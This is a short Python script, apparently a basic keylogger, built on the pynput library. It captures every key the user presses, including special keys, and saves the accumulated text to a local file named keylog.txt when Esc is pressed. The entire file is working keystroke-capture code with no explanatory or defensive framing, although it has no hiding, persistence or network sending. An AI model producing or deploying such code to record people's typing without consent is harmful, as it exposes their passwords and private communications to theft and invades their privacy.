import pynput.keyboard

log = ""

def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "

    if key == pynput.keyboard.Key.esc:
        write_to_file()
        return False

def write_to_file():
    global log
    with open("keylog.txt", "w") as f:
        f.write(log)

with pynput.keyboard.Listener(on_press=process_key_press) as listener:
    listener.join()
